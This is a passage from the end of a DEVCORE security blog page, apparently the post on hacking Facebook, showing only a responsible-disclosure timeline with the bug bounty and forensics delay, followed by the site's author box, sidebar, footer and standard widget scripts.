+<hr />
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+  <li>2016/02/05 20:05 Provide vulnerability details to Facebook Security Team</li>
+  <li>2016/02/05 20:08 Receive automatic response</li>
+  <li>2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team</li>
+  <li>2016/02/06 07:42 Receive response from Thomas that inspection is in progress</li>
+  <li>2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD</li>
+  <li>2016/02/13 Asking if there anything I should pay special attantion to in blog post ?</li>
+  <li>2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?</li>
+  <li>2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?</li>
+  <li>2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.</li>
+  <li>2016/04/20 Receive response from Reginaldo about the forensics investigation is done</li>
+</ul>
+
+
+                    </span>
+                    
+                    <div class="author-area">
+                      <h4 class="page-content-title page-content-title-with-line">
+                        <span>作者資訊</span>
+                      </h4>
+
+                      <div class="author" style="overflow: hidden; margin-bottom: 30px;">
+                        <div class="authoe-avatar" style="float: left; width: 160px;">
+                          <img src="/assets/themes/devcore/images/avatar/orangetsai.jpg" style="margin: 0px auto; " alt="Orange Tsai" title="Orange Tsai" />
+                        </div>
+                        <div class="authoe-desc" style="margin-left: 200px;">
+                          <h4 class="author-name">
+                            <a href="/blog/author/orange">Orange Tsai</a>
+                          </h4>
+                          <div class="author-role">
+                            Consultant
+                          </div>
+                          <div class="author-intro">
+                            I am Orange : )
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    
+                    <div class="post-switch">
+                      <a class="prev" href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/" title="滲透 Facebook 的思路與發現">上一篇文章</a>
+                      
+                    </div>
+                    <div class="social-share" style="line-height: 10px; margin: 20px 0;">
+                      <div style="float: right;">
+                        <div class="fb-like" data-href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
+                      </div>
+                      <a href="#" style="dispaly:none; border-bottom:none;"> </a>
+                      <a href="https://twitter.com/share?" class="twitter-share-button">Tweet</a>
+                      <div class="g-plusone" data-size="medium"></div>
+                      <script type="text/javascript">
+                        (function() {
+                          var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+                          po.src = 'https://apis.google.com/js/platform.js';
+                          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+                        })();
+                      </script>
+                      <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+                    </div>
+                  </div>
+                  
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+                </div>
+                <div class="post-sidebar">
+                  <!--文章分類-->
+                  <div class="widget">
+                    <div class="widget-title">
+                      文章分類
+                    </div>
+                    <ul class="widget-list">
+                      
+                                        
+                    
+                      <li>
+                        <a href="/blog/category/最新消息/">最新消息 <span class="count">(2)</span></a>
+                      </li>
+                    
+                      <li>
+                        <a href="/blog/category/案例剖析/">案例剖析 <span class="count">(9)</span></a>
+                      </li>
+                    
+                      <li>
+                        <a href="/blog/category/技術專欄/">技術專欄 <span class="count">(16)</span></a>
+                      </li>
+                    
+                      <li>
+                        <a href="/blog/category/科普文章/">科普文章 <span class="count">(3)</span></a>
+                      </li>
+                    
+                      <li>
+                        <a href="/blog/category/資安新聞/">資安新聞 <span class="count">(1)</span></a>
+                      </li>
+                    
+                  
+                      <li>
+                        <a href="/blog/archive"><div class="widget-list-title">所有文章列表 »</div></a>
+                      </li>
+                      <li>
+                        <gcse:search></gcse:search>
+                      </li>
+
+                    </ul>
+                  </div>
+                  <!--文章分類 end--><!--最新文章-->
+                  <div class="widget">
+                    <div class="widget-title">
+                      最新文章
+                    </div>
+                    <ul class="widget-list">
+                        
+                      <li>
+                        <a href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">
+                          <div class="widget-list-title">
+                            How I Hacked Facebook, and Found Someone's Backdoor Script
+                          </div>
+                          <div class="widget-list-date">
+                            2016-04-21
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">
+                          <div class="widget-list-title">
+                            滲透 Facebook 的思路與發現
+                          </div>
+                          <div class="widget-list-date">
+                            2016-04-21
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2015/08/19/devcore-2015-recruit/">
+                          <div class="widget-list-title">
+                            [已結束] DEVCORE 徵求行政出納人才
+                          </div>
+                          <div class="widget-list-date">
+                            2015-08-19
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/">
+                          <div class="widget-list-title">
+                            Rails 動態樣板路徑的風險
+                          </div>
+                          <div class="widget-list-date">
+                            2015-07-24
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2015/01/30/cookie-security-insight-acer/">
+                          <div class="widget-list-title">
+                            談 Cookie 認證安全－以宏碁雲端售票為例
+                          </div>
+                          <div class="widget-list-date">
+                            2015-01-30
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2015/01/09/information-security-insight-kham/">
+                          <div class="widget-list-title">
+                            從寬宏售票談資安
+                          </div>
+                          <div class="widget-list-date">
+                            2015-01-09
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/">
+                          <div class="widget-list-title">
+                            Android WebView 為你的使用者打開了漏洞之門你知道嗎？
+                          </div>
+                          <div class="widget-list-date">
+                            2014-10-13
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2014/09/30/shellshock-CVE-2014-6271/">
+                          <div class="widget-list-title">
+                            Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌
+                          </div>
+                          <div class="widget-list-date">
+                            2014-09-30
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2014/09/24/security-of-ip-camera-and-nvr/">
+                          <div class="widget-list-title">
+                            網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？
+                          </div>
+                          <div class="widget-list-date">
+                            2014-09-24
+                          </div>
+                        </a>
+                      </li>
+  
+                      <li>
+                        <a href="/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/">
+                          <div class="widget-list-title">
+                            被遺忘的資訊洩漏－重點回顧
+                          </div>
+                          <div class="widget-list-date">
+                            2014-08-26
+                          </div>
+                        </a>
+                      </li>
+  
+
+                    </ul>
+                  </div>
+                  <!--最新文章 end--><!--文章標籤-->
+                  <div class="widget">
+                    <div class="widget-title">
+                      文章標籤
+                    </div>
+                    <ul class="widget-tags">
+                      
+                                        
+                    
+                      <li><a href="/blog/tag/公告/">公告 <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/JavaScript/">JavaScript <span class="count">(3)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Hijack/">Hijack <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/HTTP Header/">HTTP Header <span class="count">(6)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Defense/">Defense <span class="count">(9)</span></a></li>
+                    
+                      <li><a href="/blog/tag/OpenSource/">OpenSource <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Vulnerability/">Vulnerability <span class="count">(8)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Mail/">Mail <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Phishing/">Phishing <span class="count">(4)</span></a></li>
+                    
+                      <li><a href="/blog/tag/XSS/">XSS <span class="count">(3)</span></a></li>
+                    
+                      <li><a href="/blog/tag/OpenSSL/">OpenSSL <span class="count">(4)</span></a></li>
+                    
+                      <li><a href="/blog/tag/CVE/">CVE <span class="count">(8)</span></a></li>
+                    
+                      <li><a href="/blog/tag/WordPress/">WordPress <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Brute-force/">Brute-force <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/PHP/">PHP <span class="count">(3)</span></a></li>
+                    
+                      <li><a href="/blog/tag/LFI/">LFI <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/DNS/">DNS <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Reconnaissance/">Reconnaissance <span class="count">(4)</span></a></li>
+                    
+                      <li><a href="/blog/tag/SVN/">SVN <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/IM/">IM <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Facebook/">Facebook <span class="count">(3)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Session/">Session <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Cookie/">Cookie <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Statistics/">Statistics <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/WAF/">WAF <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Proxy/">Proxy <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Mobile/">Mobile <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Android/">Android <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/iOS/">iOS <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/SSL/">SSL <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/MITM/">MITM <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/infoleak/">infoleak <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/IoT/">IoT <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/IP Camera/">IP Camera <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Shell/">Shell <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/WebView/">WebView <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/UXSS/">UXSS <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Cashflow/">Cashflow <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Vulreport/">Vulreport <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Rails/">Rails <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/RCE/">RCE <span class="count">(3)</span></a></li>
+                    
+                      <li><a href="/blog/tag/IDOR/">IDOR <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/徵才/">徵才 <span class="count">(1)</span></a></li>
+                    
+                      <li><a href="/blog/tag/BugBounty/">BugBounty <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Backdoor/">Backdoor <span class="count">(2)</span></a></li>
+                    
+                      <li><a href="/blog/tag/Pentest/">Pentest <span class="count">(2)</span></a></li>
+                    
+                  
+                
+
+                    </ul>
+                  </div>
+                  <!--文章標籤 end-->
+                </div>
+              </div>
+              <div id="fb-root"></div>
+              <script>(function(d, s, id) {
+                var js, fjs = d.getElementsByTagName(s)[0];
+                if (d.getElementById(id)) return;
+                js = d.createElement(s); js.id = id;
+                js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+                fjs.parentNode.insertBefore(js, fjs);
+              }(document, 'script', 'facebook-jssdk'));</script>
+            </div>
+          </div>
+
+
+        </div>
+        <div class="footer">
+          <div class="footer-inner">
+            <div class="footer-top">
+              <div class="footer-services">
+                <a class="footer-service col" href="/services/penetration-test" title="滲透測試服務 Penetration Test">
+                  <div class="footer-service-icon service-icon service-icon-penetration-test"></div>
+                  <div class="footer-service-title">
+                    滲透測試服務
+                  </div>
+                </a><a class="footer-service col" href="/services/security-training" title="資安教育訓練 Security Training">
+                  <div class="footer-service-icon service-icon service-icon-security-training"></div>
+                  <div class="footer-service-title">
+                    資安教育訓練
+                  </div>
+                </a><a class="footer-service col" href="/services/incident-response" title="資安事件處理 Incident Response">
+                  <div class="footer-service-icon service-icon service-icon-incident-response"></div>
+                  <div class="footer-service-title">
+                    資安事件處理
+                  </div>
+                </a><a class="footer-service col" href="/services/security-consulting" title="資安顧問服務 Security Consulting">
+                  <div class="footer-service-icon service-icon service-icon-security-consulting"></div>
+                  <div class="footer-service-title">
+                    資安顧問服務
+                  </div>
+                </a>
+              </div>
+            </div>
+            <div class="footer-bottom">
+              <div class="footer-links-group">
+                <ul class="footer-links">
+                  <li>
+                    <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">Services</a>
+                  </li>
+                  <li>
+                    <a href="/blog/" title="部落格 Blog">Blog</a>
+                  </li>
+                  <li>
+                    <a href="/about/" title="關於 About">About</a>
+                  </li>
+                  <li>
+                    <a href="/contact/" title="聯絡 Contact">Contact</a>
+                  </li>
+                </ul>
+                <ul class="footer-links">
+                  <li>
+                    <a href="/services/security-seal" title="網站安全標章 Security Seal">Security Seal</a>
+                  </li>
+                  <li>
+                    <a href="/partners/" title="合作夥伴 Partners">Partners</a>
+                  </li>
+                </ul>
+                <ul class="footer-links">
+                  <li>
+                    <a href="https://www.facebook.com/D3VC0RE" title="DEVCORE Facebook 粉絲團" target="_blank">Facebook</a>
+                  </li>
+                  <li>
+                    <a href="https://plus.google.com/118439315679478709768/posts" title="DEVCORE Google+ 專頁" target="_blank">Google+</a>
+                  </li>
+                  <li>
+                    <a href="https://twitter.com/d3vc0r3" title="DEVCORE Twitter" target="_blank">Twitter</a>
+                  </li>
+                </ul>
+              </div>
+              <ul class="footer-info">
+                <li>
+                  電話：02-2718-0156
+                </li>
+                <li>
+                  Email：contact [at] devco.re
+                </li>
+                <li>
+                  統編：53955237
+                </li>
+              </ul>
+              <ul class="footer-info">
+                <li>
+                  地址：10487 台北市中山區復興北路 168 號 10 樓
+                </li>
+                <li>
+                  ©2016 DEVCORE 戴夫寇爾
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="off-canvas-mask"></div>
+      </div>
+    </div>
+    <script src="/assets/themes/devcore/javascripts/vender/modernizr.js" type="text/javascript"></script>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" type="text/javascript"></script>
+    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="/assets/themes/devcore/javascripts/off-canvas.min.js" type="text/javascript"></script>
+    <script src="/assets/themes/devcore/javascripts/all.min.js" type="text/javascript"></script>
+    <script src="/assets/themes/devcore/javascripts/gcse.js" type="text/javascript"></script>
+    
+
+
+  <script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-30830800-1']);
+  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+    <!-- Google Tag Manager -->
+    <noscript>
+      <iframe src="//www.googletagmanager.com/ns.html?id=GTM-K5B8NW" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <script>
+      (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-K5B8NW');
+    </script>
+    <!-- End Google Tag Manager -->
+  </body>
+</html>
+
